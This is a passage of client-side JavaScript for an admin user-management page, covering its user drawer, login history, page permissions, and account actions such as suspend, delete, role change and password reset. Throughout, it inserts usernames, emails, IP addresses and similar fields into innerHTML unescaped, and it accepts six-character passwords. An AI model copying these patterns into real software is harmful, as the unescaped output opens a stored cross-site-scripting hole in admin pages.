    const isSelf = user.id == (window.ALPAuth.getUser()?.userId);
    const isGodUser = user.role === 'god';

    const content = document.getElementById('um-drawer-content');
    const footer = document.getElementById('um-drawer-footer');
    if (!content) return;

    // Header section
    content.innerHTML = `
      <div style="display:flex;align-items:center;gap:14px;margin-bottom:20px;padding-bottom:18px;border-bottom:1px solid var(--border-primary);">
        <div style="width:52px;height:52px;border-radius:50%;background:${user.avatar_color||'#6366f1'};display:flex;align-items:center;justify-content:center;font-size:22px;font-weight:700;color:#fff;flex-shrink:0;position:relative;">
          ${(user.username||'?')[0].toUpperCase()}
          <span class="um-online-dot ${isOnline?'online':'offline'}" style="position:absolute;bottom:1px;right:1px;width:11px;height:11px;box-shadow:0 0 0 2px var(--bg-secondary);"></span>
        </div>
        <div style="flex:1;min-width:0;">
          <div style="font-size:16px;font-weight:800;display:flex;align-items:center;gap:8px;flex-wrap:wrap;">
            ${user.username}
            ${isSelf ? '<span style="font-size:10px;color:var(--text-muted);font-weight:600;">(you)</span>' : ''}
          </div>
          <div style="margin-top:4px;display:flex;align-items:center;gap:8px;flex-wrap:wrap;">
            <span class="um-role-badge" style="color:${rm.color};background:${rm.bg};border-color:${rm.border};">${rm.icon} ${rm.label}</span>
            ${suspended ? '<span class="um-suspended-tag">⛔ Suspended</span>' : ''}
          </div>
          <div style="font-size:11px;color:${isOnline?'var(--color-success)':'var(--text-secondary)'};margin-top:6px;display:flex;align-items:center;gap:5px;">
            <span class="um-online-dot ${isOnline?'online':'offline'}" style="width:7px;height:7px;"></span>
            ${isOnline ? 'Online now' : (user.last_login ? `Last seen ${_relTime(user.last_login)}` : 'Never logged in')}
          </div>
        </div>
      </div>

      <!-- Tabs -->
      <div class="um-drawer-tabs">
        <button class="um-drawer-tab ${_drawerTab==='overview'?'active':''}" onclick="UserManagementPage._switchDrawerTab('overview')">Overview</button>
        <button class="um-drawer-tab ${_drawerTab==='history'?'active':''}" onclick="UserManagementPage._switchDrawerTab('history')">Login History</button>
        <button class="um-drawer-tab ${_drawerTab==='perms'?'active':''}" onclick="UserManagementPage._switchDrawerTab('perms')">Permissions</button>
      </div>

      <div id="um-drawer-tab-body"></div>
    `;

    _renderDrawerTab(user);

    // Footer actions
    if (!isGodUser && !isSelf) {
      footer.style.display = 'flex';
      footer.innerHTML = `
        <button class="btn btn-ghost btn-sm" onclick="UserManagementPage._toggleSuspend(${user.id})" style="${suspended ? 'color:var(--color-success);' : 'color:var(--color-warning);'}">
          ${suspended ? '✓ Activate Account' : '⛔ Suspend Account'}
        </button>
        <button class="btn btn-ghost btn-sm" onclick="UserManagementPage._terminateSession(${user.id})" style="color:var(--color-warning);margin-left:auto;">
          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18.36 6.64a9 9 0 11-12.73 0"/><line x1="12" y1="2" x2="12" y2="12"/></svg>
          Terminate Session
        </button>
        <button class="btn btn-danger btn-sm" onclick="UserManagementPage._confirmDelete(${user.id})">Delete</button>
      `;
    } else {
      footer.style.display = 'none';
    }
  }

  function _switchDrawerTab(tab) {
    _drawerTab = tab;
    const user = _users.find(u => u.id === _drawerUserId);
    if (!user) return;
    // update tab active states
    document.querySelectorAll('.um-drawer-tab').forEach(btn => {
      btn.classList.toggle('active', btn.getAttribute('onclick').includes(`'${tab}'`));
    });
    _renderDrawerTab(user);
  }

  function _renderDrawerTab(user) {
    const body = document.getElementById('um-drawer-tab-body');
    if (!body) return;

    if (_drawerTab === 'overview') {
      const permsPages = (user.permissions && user.permissions.pages) || {};
      const blockedCount = PAGE_FEATURES.filter(f => permsPages[f.key] === false).length;
      body.innerHTML = `
        <div class="um-info-row"><span class="um-info-label">Email</span><span style="font-size:13px;">${user.email}</span></div>
        <div class="um-info-row"><span class="um-info-label">Role</span><span style="font-size:13px;">${user.role}</span></div>
        <div class="um-info-row"><span class="um-info-label">Created</span><span style="font-size:13px;">${user.created_at ? new Date(user.created_at).toLocaleDateString() : 'Unknown'}</span></div>
        <div class="um-info-row"><span class="um-info-label">Last Login</span><span style="font-size:13px;">${user.last_login ? `${new Date(user.last_login).toLocaleString()} (${_relTime(user.last_login)})` : 'Never'}</span></div>
        <div class="um-info-row"><span class="um-info-label">Page Access</span><span style="font-size:13px;">${user.role === 'god' ? 'All pages (god)' : blockedCount === 0 ? `All ${PAGE_FEATURES.length} pages` : `${PAGE_FEATURES.length - blockedCount}/${PAGE_FEATURES.length} pages`}</span></div>
        <div class="um-info-row"><span class="um-info-label">Status</span>
          <span style="font-size:13px;color:${_isSuspended(user) ? 'var(--color-danger)' : _onlineIds.has(user.id) ? 'var(--color-success)' : 'var(--text-secondary)'};">
            ${_isSuspended(user) ? '⛔ Suspended' : _onlineIds.has(user.id) ? '🟢 Online' : '⚪ Offline'}
          </span>
        </div>
        ${user.role !== 'god' ? `
        <div style="margin-top:16px;padding-top:16px;border-top:1px solid var(--border-primary);">
          <div style="font-size:11px;font-weight:700;color:var(--text-secondary);text-transform:uppercase;letter-spacing:.6px;margin-bottom:12px;">Quick Edit</div>
          <div style="display:flex;gap:8px;flex-wrap:wrap;">
            <select id="dr-role-select" class="um-select" style="flex:1;">
              <option value="viewer" ${user.role==='viewer'?'selected':''}>👁 Viewer</option>
              <option value="admin" ${user.role==='admin'?'selected':''}>🔧 Admin</option>
              <option value="super_admin" ${user.role==='super_admin'?'selected':''}>⭐ Super Admin</option>
            </select>
            <button class="btn btn-primary btn-sm" onclick="UserManagementPage._quickRoleChange(${user.id})">Update Role</button>
          </div>
          <div style="margin-top:10px;display:flex;gap:8px;">
            <input type="password" id="dr-password" class="form-input" placeholder="New password (optional)…" style="flex:1;font-size:13px;">
            <button class="btn btn-ghost btn-sm" onclick="UserManagementPage._quickPasswordReset(${user.id})">Reset</button>
          </div>
        </div>` : ''}
      `;
    } else if (_drawerTab === 'history') {
      body.innerHTML = `<div style="text-align:center;padding:24px;color:var(--text-secondary);font-size:13px;"><div class="spinner" style="margin:0 auto 10px;"></div>Loading login history…</div>`;
      window.ALPApi.godGetUserHistory(user.id).then(({ history }) => {
        if (!body || !document.getElementById('um-drawer-tab-body')) return;
        if (!history || !history.length) {
          body.innerHTML = '<div style="text-align:center;padding:24px;color:var(--text-secondary);font-size:13px;">No login history found.</div>';
          return;
        }
        body.innerHTML = `
          <div style="font-size:11px;color:var(--text-secondary);margin-bottom:10px;">${history.length} records found (most recent first)</div>
          ${history.map(h => {
            const success = h.action === 'User logged in';
            const d = h.details || {};
            return `
              <div class="um-history-row">
                <div style="font-size:16px;flex-shrink:0;">${success ? '✅' : '❌'}</div>
                <div style="flex:1;min-width:0;">
                  <div style="font-weight:600;font-size:12px;color:${success?'var(--color-success)':'var(--color-danger)'};">${success ? 'Successful Login' : 'Failed Attempt'}</div>
                  <div style="font-size:11px;color:var(--text-secondary);margin-top:2px;line-height:1.5;">
                    ${_relTime(h.timestamp)} · ${new Date(h.timestamp).toLocaleString()}
                    ${h.ip_address ? `<br>${h.ip_address}${d.country ? ` · ${d.country}` : ''}${d.city ? `, ${d.city}` : ''}` : ''}
                    ${d.browser ? `<br>${d.browser}${d.os ? ` on ${d.os}` : ''} · ${d.device || 'Desktop'}` : ''}
                  </div>
                </div>
              </div>`;
          }).join('')}
        `;
      }).catch(() => {
        if (body) body.innerHTML = '<div style="color:var(--color-danger);font-size:12px;padding:8px;">Failed to load login history.</div>';
      });
    } else if (_drawerTab === 'perms') {
      const isGodUser = user.role === 'god';
      if (isGodUser) {
        body.innerHTML = '<div style="text-align:center;padding:24px;color:var(--text-secondary);font-size:13px;">👑 God admin has unrestricted access to all pages.</div>';
        return;
      }
      const permsPages = (user.permissions && user.permissions.pages) || {};
      const sections = {};
      PAGE_FEATURES.forEach(f => { if (!sections[f.section]) sections[f.section] = []; sections[f.section].push(f); });

      body.innerHTML = `
        <div style="margin-bottom:14px;display:flex;justify-content:space-between;align-items:center;">
          <div style="font-size:12px;color:var(--text-secondary);">Toggle page access. Changes save immediately.</div>
          <div style="display:flex;gap:6px;">
            <button class="btn btn-sm btn-ghost" style="font-size:11px;" onclick="UserManagementPage._drawerSetAllPerms(true)">All On</button>
            <button class="btn btn-sm btn-ghost" style="font-size:11px;" onclick="UserManagementPage._drawerSetAllPerms(false)">All Off</button>
          </div>
        </div>
        ${Object.entries(sections).map(([sec, features]) => `
          <div class="um-perm-section">
            <div class="um-perm-section-title">${sec}</div>
            <div class="um-perm-chips">
              ${features.map(f => {
                const enabled = permsPages[f.key] !== false;
                return `
                  <label class="um-perm-chip ${!enabled ? 'blocked' : ''}" id="um-perm-chip-${f.key}" title="${enabled ? 'Click to block' : 'Click to allow'}">
                    <input type="checkbox" id="dp-perm-${f.key}" ${enabled?'checked':''} style="accent-color:var(--accent-primary);" onchange="UserManagementPage._drawerPermChange(${user.id})">
                    ${f.label}
                  </label>`;
              }).join('')}
            </div>
          </div>
        `).join('')}
        <button class="btn btn-primary" style="width:100%;margin-top:16px;" id="dr-perms-save-btn" onclick="UserManagementPage._saveDrawerPerms(${user.id})">
          Save Permissions
        </button>
      `;

      // Sync chip classes on checkbox change
      PAGE_FEATURES.forEach(f => {
        const cb = document.getElementById(`dp-perm-${f.key}`);
        if (cb) cb.addEventListener('change', () => {
          const chip = document.getElementById(`um-perm-chip-${f.key}`);
          if (chip) chip.classList.toggle('blocked', !cb.checked);
        });
      });
    }
  }

  function _drawerPermChange() { /* handled by checkbox onchange */ }

  function _drawerSetAllPerms(enabled) {
    PAGE_FEATURES.forEach(f => {
      const cb = document.getElementById(`dp-perm-${f.key}`);
      const chip = document.getElementById(`um-perm-chip-${f.key}`);
      if (cb) cb.checked = enabled;
      if (chip) chip.classList.toggle('blocked', !enabled);
    });
  }

  async function _saveDrawerPerms(userId) {
    const btn = document.getElementById('dr-perms-save-btn');
    if (btn) { btn.disabled = true; btn.textContent = 'Saving…'; }
    try {
      const pages = {};
      PAGE_FEATURES.forEach(f => {
        const cb = document.getElementById(`dp-perm-${f.key}`);
        if (cb && !cb.checked) pages[f.key] = false;
      });
      const user = _users.find(u => u.id === userId);
      const perms = { ...(user?.permissions || {}), pages };
      await window.ALPApi.godUpdateUser(userId, { permissions: perms });
      window.showToast('Permissions saved', 'success');
      await loadAll(false);
      if (_drawerUserId === userId) _renderDrawer();
    } catch (err) {
      window.showToast(err.message || 'Failed to save permissions', 'error');
    } finally {
      if (btn) { btn.disabled = false; btn.textContent = 'Save Permissions'; }
    }
  }

  async function _quickRoleChange(userId) {
    const sel = document.getElementById('dr-role-select');
    if (!sel) return;
    try {
      await window.ALPApi.godUpdateUser(userId, { role: sel.value });
      window.showToast('Role updated', 'success');
      await loadAll(false);
      if (_drawerUserId === userId) _renderDrawer();
    } catch (err) {
      window.showToast(err.message || 'Failed to update role', 'error');
    }
  }

  async function _quickPasswordReset(userId) {
    const inp = document.getElementById('dr-password');
    if (!inp || !inp.value.trim()) { window.showToast('Enter a new password first', 'error'); return; }
    if (inp.value.length < 6) { window.showToast('Password must be at least 6 characters', 'error'); return; }
    try {
      await window.ALPApi.godUpdateUser(userId, { password: inp.value });
      inp.value = '';
      window.showToast('Password reset successfully', 'success');
    } catch (err) {
      window.showToast(err.message || 'Failed to reset password', 'error');
    }
  }

  // ── Actions ───────────────────────────────────────────────────────────────

  function _openEdit(userId) {
    _openDrawer(userId);
    _drawerTab = 'overview';
    const user = _users.find(u => u.id === userId);
    if (user) _renderDrawer();
  }

  function _toggleSuspend(userId) {
    const user = _users.find(u => u.id === userId);
    if (!user) return;
    const suspended = _isSuspended(user);
    window.showModal({
      title: suspended ? 'Activate Account' : 'Suspend Account',
      message: suspended
        ? `Activate <strong>${user.username}</strong>? They will be able to log in again.`
        : `Suspend <strong>${user.username}</strong>? They will be immediately signed out and unable to log in.`,
      confirmText: suspended ? 'Activate' : 'Suspend',
      confirmClass: suspended ? 'btn-success' : 'btn-danger',
      onConfirm: async () => {
        try {
          await window.ALPApi.godSuspendUser(userId, !suspended);
          window.showToast(suspended ? `${user.username} activated` : `${user.username} suspended`, suspended ? 'success' : 'warning');
          await loadAll(false);
          if (_drawerUserId === userId) _renderDrawer();
        } catch (err) {
          window.showToast(err.message || 'Failed', 'error');
        }
      }
    });
  }

  function _terminateSession(userId) {
    const user = _users.find(u => u.id === userId);
    if (!user) return;
    window.showModal({
      title: 'Terminate Session',
      message: `Force sign out <strong>${user.username}</strong>? Their active session token will be invalidated.`,
      confirmText: 'Terminate',
      confirmClass: 'btn-danger',
      onConfirm: async () => {
        try {
          await window.ALPApi.godTerminateSession(userId);
          window.showToast(`${user.username}'s session terminated`, 'success');
          await loadAll(false);
        } catch (err) {
          window.showToast(err.message || 'Failed to terminate session', 'error');
        }
      }
    });
  }

  function _confirmDelete(userId) {
    const user = _users.find(u => u.id === userId);
    if (!user) return;
    window.showModal({
      title: 'Delete Admin Account',
      message: `Permanently delete <strong>${user.username}</strong> (${user.email})? This action cannot be undone.`,
      confirmText: 'Delete',
      confirmClass: 'btn-danger',
      onConfirm: async () => {
        try {
          await window.ALPApi.godDeleteUser(userId);
          window.showToast(`${user.username} deleted`, 'success');
          if (_drawerUserId === userId) closeDrawer();
          await loadAll(false);
        } catch (err) {
          window.showToast(err.message || 'Failed to delete user', 'error');
        }
      }
    });
  }

  // ── Create Modal ──────────────────────────────────────────────────────────

  function openCreateModal() {
    window.showModal({
      title: 'New Admin Account',
      html: `
        <div style="display:flex;flex-direction:column;gap:14px;">
          <div>
            <label style="display:block;font-size:12px;font-weight:600;margin-bottom:5px;color:var(--text-secondary);">USERNAME</label>
            <input id="nc-username" class="form-input" style="width:100%;" placeholder="username" autocomplete="off">
          </div>
          <div>
            <label style="display:block;font-size:12px;font-weight:600;margin-bottom:5px;color:var(--text-secondary);">EMAIL</label>
            <input id="nc-email" class="form-input" type="email" style="width:100%;" placeholder="user@example.com">
          </div>
          <div>
            <label style="display:block;font-size:12px;font-weight:600;margin-bottom:5px;color:var(--text-secondary);">PASSWORD</label>
            <input id="nc-password" class="form-input" type="password" style="width:100%;" placeholder="Min. 6 characters">
          </div>
          <div>
            <label style="display:block;font-size:12px;font-weight:600;margin-bottom:5px;color:var(--text-secondary);">ROLE</label>
            <select id="nc-role" class="form-input" style="width:100%;">
              <option value="viewer">👁 Viewer</option>
              <option value="admin">🔧 Admin</option>
              <option value="super_admin">⭐ Super Admin</option>
            </select>
          </div>
        </div>
      `,
      confirmText: 'Create Admin',
      onConfirm: async () => {
        const username = document.getElementById('nc-username')?.value.trim();
        const email = document.getElementById('nc-email')?.value.trim();
        const password = document.getElementById('nc-password')?.value;
        const role = document.getElementById('nc-role')?.value;

        if (!username || !email || !password) { window.showToast('All fields are required', 'error'); return false; }
        if (password.length < 6) { window.showToast('Password must be at least 6 characters', 'error'); return false; }

        try {
          await window.ALPApi.godCreateUser({ username, email, password, role });
          window.showToast(`"${username}" created successfully`, 'success');
          await loadAll(false);
        } catch (err) {
          window.showToast(err.message || 'Failed to create user', 'error');
          return false;
        }
      }
    });
  }

  // ── Helpers ───────────────────────────────────────────────────────────────

  function _relTime(ts) {
    if (!ts) return 'Never';
    const diff = Date.now() - new Date(ts).getTime();
    if (diff < 60000) return 'Just now';
    if (diff < 3600000) return `${Math.floor(diff / 60000)}m ago`;
    if (diff < 86400000) return `${Math.floor(diff / 3600000)}h ago`;
    if (diff < 604800000) return `${Math.floor(diff / 86400000)}d ago`;
    return new Date(ts).toLocaleDateString();
  }

  function _debounce(fn, ms) {
    let t;
    return (...args) => { clearTimeout(t); t = setTimeout(() => fn(...args), ms); };
  }

  // ── Lifecycle ─────────────────────────────────────────────────────────────

  function destroy() {
    if (_refreshTimer) clearInterval(_refreshTimer);
    _refreshTimer = null;

    if (_presenceUnsub && window.ALPSocket) {
      window.ALPSocket.off('admin:presence', _presenceUnsub);
    }
    _presenceUnsub = null;

    // Remove drawer DOM if still mounted
    const overlay = document.getElementById('um-drawer-overlay');
    const panel = document.getElementById('um-drawer-panel');
    if (overlay) overlay.style.display = 'none';
    if (panel) panel.classList.remove('open');

    _users = [];
    _stats = null;
    _onlineIds = new Set();
    _drawerUserId = null;
  }

  return {
    render,
    init,
    destroy,
    // Called from inline event handlers
    _openEdit,
    _openDrawer,
    _switchDrawerTab,
    _drawerSetAllPerms,
    _drawerPermChange,
    _saveDrawerPerms,
    _quickRoleChange,
    _quickPasswordReset,
    _toggleSuspend,
    _terminateSession,
    _confirmDelete,
  };
})();

window.UserManagementPage = UserManagementPage;
